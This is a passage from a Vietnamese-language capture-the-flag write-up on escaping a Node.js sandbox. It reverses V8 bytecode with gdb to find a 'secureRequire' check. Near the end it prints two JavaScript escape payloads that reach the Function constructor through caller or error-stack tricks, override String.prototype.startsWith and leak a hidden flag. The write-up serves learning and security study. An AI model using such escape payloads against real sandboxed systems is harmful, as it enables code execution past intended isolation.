        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#reversing-v8-bytecode" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Tới đây mình quyết định trace các function call của V8</p>
<pre tabindex="0"><code>node --trace test.js
</code></pre><p>Vì khi trace như vầy thì nó sẽ in ra tất cả function call của nodejs internal, ta có thể narrow down bằng cách tìm đến đoạn bắt đầu load <code>utils.js</code> vì sau đó chắc chắn là các function call của <code>utils.jsc</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5c571f1d-1e71-40d2-824a-a85e412684c2" alt="image" />
    
  </figure>
</p>
<p>Chắc là cỡ đoạn này, tiếp tục trace xuống ta thấy nó import module <code>util</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7a53c379-1adc-4568-8bc0-c7ac5052628e" alt="image" />
    
  </figure>
</p>
<p>Tìm thấy đoạn nó thao tác với symbol <code>nodejs.util.inspect.custom</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/716f16f6-da33-40a5-949b-7801e0c485f5" alt="image" />
    
  </figure>
</p>
<p>Chưa có thông tin gì nhiều lắm, nhưng với 2 dữ kiện là import <code>util</code> và truy cập vào symbol <code>nodejs.util.inspect.custom</code> thì có thể <code>globalThis.storage</code> đang chứa gì đó, tới đây mình quyết định debug v8 của nodejs</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">runBytecodeFile</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;./bytecode.js&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">globalThis</span><span class="p">.</span><span class="nx">require</span> <span class="o">=</span> <span class="nx">require</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">secret</span> <span class="o">=</span> <span class="s2">&#34;SECRET&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">flag</span> <span class="o">=</span> <span class="s2">&#34;FLAG&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">globalThis</span><span class="p">.</span><span class="nx">storage</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({</span> <span class="nx">secret</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">get</span><span class="o">:</span> <span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">name</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="s2">&#34;secret&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="nx">getOwnPropertyDescriptor</span><span class="o">:</span> <span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">name</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="s2">&#34;secret&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">value</span><span class="o">:</span> <span class="nx">flag</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">writable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">enumerable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">configurable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="p">};</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">runBytecodeFile</span><span class="p">(</span><span class="s2">&#34;./utils.jsc&#34;</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">globalThis</span><span class="p">.</span><span class="nx">storage</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">SystemBreak</span><span class="p">();</span>
</span></span></code></pre></div><pre tabindex="0"><code>gdb node
pwndbg&gt; r --allow-natives-syntax test.js
</code></pre><p>Ta dùng option &ndash;allow-natives-syntax thì v8 sẽ expose ra một số API phục vụ cho debug, <code>%DebugPrint</code> sẽ in các thông tin về memory của một object, <code>%SystemBreak</code> sẽ dùng để set breakpoint. Mình sẽ dùng gdb script của v8 để tiện cho debug: <a href="https://chromium.googlesource.com/v8/v8/&#43;/refs/heads/main/tools/gdbinit" target="_blank">https://chromium.googlesource.com/v8/v8/+/refs/heads/main/tools/gdbinit</a></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/74764246-1660-4478-8d36-a508cae8505c" alt="image" />
    
  </figure>
</p>
<pre tabindex="0"><code>target: 0x17067d4aec29
</code></pre><p>Đây là <code>global.storage</code>, ta sẽ inspect nó bằng lên <code>job</code> của v8 gdb script</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/edf3feb7-3005-47a7-8fa2-e85ec751f3e9" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/484d8707-772a-4409-803a-be922b7d9275" alt="image" />
    
  </figure>
</p>
<p>Tìm thấy symbol đó rồi, giờ ta sẽ inspect byte codes của nó</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/805f8149-15be-4c13-be87-4e6ddc76a4ab" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/91b339e7-e26d-4040-8a70-c70c7c4ef4d6" alt="image" />
    
  </figure>
</p>
<p>Đây là các constant của nó, v8 bytecode chỉ thao tác với các constant, register gồm thanh ghi accumulator và các thanh ghi r0, r1, &hellip;</p>
<p>Để tìm hiểu cách các opcode hoạt động thì mình đi vào source V8</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/912ce82a-5604-4d58-a4ad-c02b98ba36db" alt="image" />
    
  </figure>
</p>
<p>Cứ search through source và mình tìm được handler của opcode, lấy ví dụ của <code>TestReferenceEqual</code>, đầu tiên nó sẽ lấy trá trị từ register tại arg 1, so sánh với accumulator register, lưu kết quả vào accumulator register. Ngay sau <code>TestReferenceEqual</code> là <code>JumpIfTrue</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/606738f3-e1e8-4209-9d1e-71944e2af705" alt="image" />
    
  </figure>
</p>
<p>Tại đây sẽ check kết quả từ accumulator register để quyết định có jump hay không, cứ thế ta sẽ reverse dần để tìm ra flow đúng.</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/bf475f42-1f6b-48ae-87b8-96941d0d6e53" alt="image" />
    
  </figure>
</p>
<p>Đoạn này sẽ load <code>depth</code> vào, truyền vào <code>parseInt</code> và kết quả trả về lưu vào trong r0</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4b48eb63-9b3e-4e31-b958-45f198e4a589" alt="image" />
    
  </figure>
</p>
<p>Sau đó sẽ tiếp tục so sánh xem có lớn hơn <code>3</code> không</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2bb2743a-9074-4f2c-a558-15e8fb0c6682" alt="image" />
    
  </figure>
</p>
<p>Nếu đúng thì sẽ load constant 2 là <code>Error: Too deep</code> và return</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9c33b1ca-5fe8-4869-ba39-f54afa29ca99" alt="image" />
    
  </figure>
</p>
<p>Để kiểm chứng thì ta có thể chạy thử</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/f657111b-cf26-4ba5-927c-f00922cafc53" alt="image" />
    
  </figure>
</p>
<p>Nếu sai thì jump đến <code>+28</code>, tại đây như ban đầu ta biết <code>a1</code> là depth, vậy là lúc nãy truyền vào <code>parseInt</code> để check thôi chứ depth không bị thay đổi, tiếp tục lưu <code>depth</code> vào <code>r0</code> bằng lệnh <code>Star0</code> và so sánh với <code>Infinity</code>, nếu không bằng thì sẽ nhảy đến <code>+46</code>, tại <code>+46</code> sẽ load constant <code>haha nice try!</code> và return</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/10c13d29-5cc5-45a7-b29d-35573ac69e19" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9175f2bb-6565-4827-bfc8-76f4bd62f596" alt="image" />
    
  </figure>
</p>
<p>Vậy có vẻ nhánh ta cần vào là lúc <code>depth</code> == <code>Infinity</code>, cùng thử xem sao</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">runBytecodeFile</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;./bytecode.js&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">globalThis</span><span class="p">.</span><span class="nx">require</span> <span class="o">=</span> <span class="nx">require</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">secret</span> <span class="o">=</span> <span class="s2">&#34;SECRET&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">flag</span> <span class="o">=</span> <span class="s2">&#34;FLAG&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">globalThis</span><span class="p">.</span><span class="nx">storage</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({</span> <span class="nx">secret</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">get</span><span class="o">:</span> <span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">name</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="s2">&#34;secret&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="nx">getOwnPropertyDescriptor</span><span class="o">:</span> <span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">name</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="s2">&#34;secret&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">value</span><span class="o">:</span> <span class="nx">flag</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">writable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">enumerable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">configurable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="p">};</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">runBytecodeFile</span><span class="p">(</span><span class="s2">&#34;./utils.jsc&#34;</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// %DebugPrint(globalThis.storage);
</span></span></span><span class="line"><span class="cl"><span class="c1">// %SystemBreak();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">util</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;util&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">util</span><span class="p">.</span><span class="nx">inspect</span><span class="p">(</span><span class="nx">globalThis</span><span class="p">.</span><span class="nx">storage</span><span class="p">,</span> <span class="p">{</span> <span class="nx">compact</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">depth</span><span class="o">:</span> <span class="kc">Infinity</span><span class="p">,</span> <span class="nx">breakLength</span><span class="o">:</span> <span class="mi">0</span> <span class="p">}))</span>
</span></span></code></pre></div><pre tabindex="0"><code>{
  &#39;👺&#39;: {
    &#39;👺&#39;: {
      &#39;👺&#39;: {
        &#39;👺&#39;: {
          &#39;👺&#39;: {
            &#39;👺&#39;: {
              &#39;👺&#39;: {
                &#39;👺&#39;: {
                  &#39;👺&#39;: {
                    &#39;👺&#39;: {
                      &#39;👺&#39;: {
                        &#39;👺&#39;: {
                          &#39;👺&#39;: {
                            &#39;👺&#39;: {
                                &#39;👺&#39;: [Object: Inspection interrupted prematurely. Maximum call stack size exceeded.]
...
</code></pre><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7d7a9455-5ca1-4845-a54f-edf8b82a46f7" alt="image" />
    
  </figure>
</p>
<p>Hình như depth bị lớn quá, thử trên server xem, giờ ta sẽ phải import <code>util</code> vào</p>
<pre tabindex="0"><code>&lt;ref *1&gt; Object [global] {
  global: [Circular *1],
  clearImmediate: [Function: clearImmediate],
  setImmediate: [Function: setImmediate] {
    [Symbol(nodejs.util.promisify.custom)]: [Getter]
  },
  clearInterval: [Function: clearInterval],
  clearTimeout: [Function: clearTimeout],
  setInterval: [Function: setInterval],
  setTimeout: [Function: setTimeout] {
    [Symbol(nodejs.util.promisify.custom)]: [Getter]
  },
  queueMicrotask: [Function: queueMicrotask],
  structuredClone: [Getter/Setter],
  atob: [Getter/Setter],
  btoa: [Getter/Setter],
  performance: [Getter/Setter],
  fetch: [AsyncFunction: fetch],
  crypto: [Getter],
  storage: {
    &#39;👺&#39;: {
      &#39;👺&#39;: {
        &#39;👺&#39;: {
          &#39;👺&#39;: {
...
secureRequire: [Function: secureRequire]
</code></pre><p>Ta thấy được function <code>secureRequire</code>, thử dùng <code>%DebugPrint</code> để xem bytecode của <code>secureRequire</code> như cách vừa nãy thử</p>
<pre tabindex="0"><code>0xd73e1e351a1: [BytecodeArray] in OldSpace
 - map: 0x13cd552c0fd1 &lt;Map(BYTECODE_ARRAY_TYPE)&gt;
Parameter count 2
Register count 14
Frame size 112
Bytecode age: 0
 9774 S&gt; 0xd73e1e351d6 @    0 : 79 00 00 25       CreateArrayLiteral [0], [0], #37
         0xd73e1e351da @    4 : c4                Star0
10013 S&gt; 0xd73e1e351db @    5 : 12                LdaFalse
         0xd73e1e351dc @    6 : c3                Star1
10048 S&gt; 0xd73e1e351dd @    7 : b1 fa 01 03       GetIterator r0, [1], [3]
         0xd73e1e351e1 @   11 : be                Star6
         0xd73e1e351e2 @   12 : 2d f4 01 05       GetNamedProperty r6, [1], [5]
         0xd73e1e351e6 @   16 : bf                Star5
         0xd73e1e351e7 @   17 : 12                LdaFalse
         0xd73e1e351e8 @   18 : bd                Star7
         0xd73e1e351e9 @   19 : 19 ff f0          Mov &lt;context&gt;, r10
         0xd73e1e351ec @   22 : 11                LdaTrue
         0xd73e1e351ed @   23 : bd                Star7
10040 S&gt; 0xd73e1e351ee @   24 : 5d f5 f4 07       CallProperty0 r5, r6, [7]
         0xd73e1e351f2 @   28 : b9                Star11
         0xd73e1e351f3 @   29 : 9f 07             JumpIfJSReceiver [7] (0xd73e1e351fa @ 36)
         0xd73e1e351f5 @   31 : 65 c6 00 ef 01    CallRuntime [ThrowIteratorResultNotAnObject], r11-r11
         0xd73e1e351fa @   36 : 2d ef 02 09       GetNamedProperty r11, [2], [9]
         0xd73e1e351fe @   40 : 96 25             JumpIfToBooleanTrue [37] (0xd73e1e35223 @ 77)
         0xd73e1e35200 @   42 : 2d ef 03 0b       GetNamedProperty r11, [3], [11]
         0xd73e1e35204 @   46 : b9                Star11
         0xd73e1e35205 @   47 : 12                LdaFalse
         0xd73e1e35206 @   48 : bd                Star7
         0xd73e1e35207 @   49 : 19 ef f8          Mov r11, r2
10040 S&gt; 0xd73e1e3520a @   52 : 19 f8 f6          Mov r2, r4
10074 S&gt; 0xd73e1e3520d @   55 : 0b f8             Ldar r2
10081 E&gt; 0xd73e1e3520f @   57 : 6b 03 0d          TestEqual a0, [13]
         0xd73e1e35212 @   60 : 98 09             JumpIfTrue [9] (0xd73e1e3521b @ 69)
         0xd73e1e35214 @   62 : 13 04             LdaConstant [4]
10095 E&gt; 0xd73e1e35216 @   64 : 6b 03 0e          TestEqual a0, [14]
         0xd73e1e35219 @   67 : 99 06             JumpIfFalse [6] (0xd73e1e3521f @ 73)
10125 S&gt; 0xd73e1e3521b @   69 : 11                LdaTrue
         0xd73e1e3521c @   70 : c3                Star1
10156 S&gt; 0xd73e1e3521d @   71 : 8a 06             Jump [6] (0xd73e1e35223 @ 77)
10031 E&gt; 0xd73e1e3521f @   73 : 89 33 00 0f       JumpLoop [51], [0], [15] (0xd73e1e351ec @ 22)
         0xd73e1e35223 @   77 : 0d ff             LdaSmi [-1]
         0xd73e1e35225 @   79 : bb                Star9
         0xd73e1e35226 @   80 : bc                Star8
         0xd73e1e35227 @   81 : 8a 05             Jump [5] (0xd73e1e3522c @ 86)
         0xd73e1e35229 @   83 : bb                Star9
         0xd73e1e3522a @   84 : 0c                LdaZero
         0xd73e1e3522b @   85 : bc                Star8
         0xd73e1e3522c @   86 : 10                LdaTheHole
         0xd73e1e3522d @   87 : a6                SetPendingMessage
         0xd73e1e3522e @   88 : ba                Star10
         0xd73e1e3522f @   89 : 0b f3             Ldar r7
         0xd73e1e35231 @   91 : 96 23             JumpIfToBooleanTrue [35] (0xd73e1e35254 @ 126)
         0xd73e1e35233 @   93 : 19 ff ef          Mov &lt;context&gt;, r11
         0xd73e1e35236 @   96 : 2d f4 05 10       GetNamedProperty r6, [5], [16]
         0xd73e1e3523a @  100 : 9e 1a             JumpIfUndefinedOrNull [26] (0xd73e1e35254 @ 126)
         0xd73e1e3523c @  102 : b8                Star12
         0xd73e1e3523d @  103 : 5d ee f4 12       CallProperty0 r12, r6, [18]
         0xd73e1e35241 @  107 : 9f 13             JumpIfJSReceiver [19] (0xd73e1e35254 @ 126)
         0xd73e1e35243 @  109 : b7                Star13
         0xd73e1e35244 @  110 : 65 c6 00 ed 01    CallRuntime [ThrowIteratorResultNotAnObject], r13-r13
         0xd73e1e35249 @  115 : 8a 0b             Jump [11] (0xd73e1e35254 @ 126)
         0xd73e1e3524b @  117 : b9                Star11
         0xd73e1e3524c @  118 : 0c                LdaZero
         0xd73e1e3524d @  119 : 1c f2             TestReferenceEqual r8
         0xd73e1e3524f @  121 : 98 05             JumpIfTrue [5] (0xd73e1e35254 @ 126)
         0xd73e1e35251 @  123 : 0b ef             Ldar r11
         0xd73e1e35253 @  125 : a8                ReThrow
         0xd73e1e35254 @  126 : 0b f0             Ldar r10
         0xd73e1e35256 @  128 : a6                SetPendingMessage
         0xd73e1e35257 @  129 : 0c                LdaZero
         0xd73e1e35258 @  130 : 1c f2             TestReferenceEqual r8
         0xd73e1e3525a @  132 : 99 05             JumpIfFalse [5] (0xd73e1e3525f @ 137)
         0xd73e1e3525c @  134 : 0b f1             Ldar r9
         0xd73e1e3525e @  136 : a8                ReThrow
10200 S&gt; 0xd73e1e3525f @  137 : 0b f9             Ldar r1
         0xd73e1e35261 @  139 : 96 04             JumpIfToBooleanTrue [4] (0xd73e1e35265 @ 143)
10225 S&gt; 0xd73e1e35263 @  141 : 0e                LdaUndefined
10232 S&gt; 0xd73e1e35264 @  142 : a9                Return
10251 S&gt; 0xd73e1e35265 @  143 : 2d 03 06 14       GetNamedProperty a0, [6], [20]
         0xd73e1e35269 @  147 : bf                Star5
         0xd73e1e3526a @  148 : 13 04             LdaConstant [4]
         0xd73e1e3526c @  150 : bd                Star7
10251 E&gt; 0xd73e1e3526d @  151 : 5e f5 03 f3 16    CallProperty1 r5, a0, r7, [22]
         0xd73e1e35272 @  156 : 97 04             JumpIfToBooleanFalse [4] (0xd73e1e35276 @ 160)
10284 S&gt; 0xd73e1e35274 @  158 : 0e                LdaUndefined
10291 S&gt; 0xd73e1e35275 @  159 : a9                Return
10311 S&gt; 0xd73e1e35276 @  160 : 17 06             LdaImmutableCurrentContextSlot [6]
         0xd73e1e35278 @  162 : aa 07             ThrowReferenceErrorIfHole [7]
         0xd73e1e3527a @  164 : bf                Star5
10318 E&gt; 0xd73e1e3527b @  165 : 62 f5 03 18       CallUndefinedReceiver1 r5, a0, [24]
10335 S&gt; 0xd73e1e3527f @  169 : a9                Return
Constant pool (size = 8)
0xd73e1e35281: [FixedArray] in OldSpace
 - map: 0x13cd552c0211 &lt;Map(FIXED_ARRAY_TYPE)&gt;
 - length: 8
           0: 0x0d73e1e352d1 &lt;ArrayBoilerplateDescription PACKED_ELEMENTS, 0x0d73e1e352e9 &lt;FixedArray[8]&gt;&gt;
           1: 0x13cd552c9211 &lt;String[4]: #next&gt;
           2: 0x13cd552c5f49 &lt;String[4]: #done&gt;
           3: 0x13cd552c4821 &lt;String[5]: #value&gt;
           4: 0x11a795fc2861 &lt;String[4]: #util&gt;
           5: 0x13cd552c70b9 &lt;String[6]: #return&gt;
           6: 0x11a795fd8471 &lt;String[10]: #startsWith&gt;
           7: 0x0d73e1e35149 &lt;String[12]: #localRequire&gt;
Handler Table (size = 32)
   from   to       hdlr (prediction,   data)
  (  22,  77)  -&gt;    83 (prediction=0, data=10)
  (  96, 115)  -&gt;   117 (prediction=0, data=11)
Source Position Table (size = 54)
0x0d73e1e35449 &lt;ByteArray[54]&gt;
</code></pre><p>Có 3 route lead đến return, ở <code>+160</code> sẽ là nơi ta cần đến vì 2 route còn lại đều là return về <code>undefined</code>.</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/d384949a-d75b-41ea-8d3b-d6022b4a85c0" alt="image" />
    
  </figure>
</p>
<p>Phần này sẽ check xem module đang require có phải là util không, nếu không thì nhảy đến <code>+160</code>, vậy là ta không được include module có tên bắt đầu bằng <code>util...</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/caf315ff-7cb8-4429-ad91-55eaa1b2c9d1" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ed4445d4-752a-4e51-b86e-3af767006cb5" alt="image" />
    
  </figure>
</p>
<p>Cách bypass của tác giả đó là override lại method <code>startsWith</code> luôn return false, để ý bảng constant ta sẽ thấy method <code>startsWith</code> được gọi để check nếu name của module bằng đầu bằng <code>util...</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/11a65428-364c-4149-8705-16f22f992788" alt="image" />
    
  </figure>
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="p">({</span> <span class="nx">toJSON</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">k</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="sb">`String.prototype.startsWith = () =&gt; false;return JSON.stringify([...globalThis.secureRequire(\&#34;util\&#34;).inspect(globalThis.storage, {customInspect: true, depth: Infinity})])`</span><span class="p">)()},</span> <span class="nx">toString</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">k</span> <span class="p">})})()</span>
</span></span></code></pre></div><p>Kết quả trả về đi qua JSON.stringify, method <code>toJSON</code> được gọi do đó ta có thể leak được external object thông qua <code>caller</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/d28d1cac-19fe-4889-9c38-49022e4ba2c7" alt="image" />
    
  </figure>
</p>
<p>Được rồi, nhưng mình chẳng thấy flag đâu cả&hellip;</p>
<p>Thử test lại ở local, nâng stack-size lên</p>
<pre tabindex="0"><code>node --stack-size=10000000 test.js
</code></pre><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e22e6dc9-dd05-4883-a999-7fb1475c011b" alt="image" />
    
  </figure>
</p>
<p>Flag hiện ra rồi, vậy là do đệ quy quá nhiều lần exceeds default stack-size. Đến đây thì mình bí rồi, mình xem thử cách làm của author</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">(()=&gt;{</span><span class="kr">const</span> <span class="nx">a</span><span class="o">=</span><span class="k">new</span> <span class="nb">Error</span><span class="p">;</span><span class="nx">a</span><span class="p">.</span><span class="nx">name</span><span class="o">=</span><span class="p">{</span><span class="nx">toString</span><span class="o">:</span><span class="k">new</span> <span class="nb">Proxy</span><span class="p">(()=&gt;{},{</span><span class="nx">apply</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">){</span><span class="k">throw</span> <span class="nx">c</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;String.prototype.startsWith = (s, p) =&gt; { return false; };return [...secureRequire(&#39;util&#39;).inspect(globalThis.storage, {customInspect: true, depth: Infinity})]&#34;</span><span class="p">)()}})};</span><span class="k">try</span><span class="p">{</span><span class="nx">a</span><span class="p">.</span><span class="nx">stack</span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="k">return</span> <span class="nx">a</span><span class="p">}})();</span>
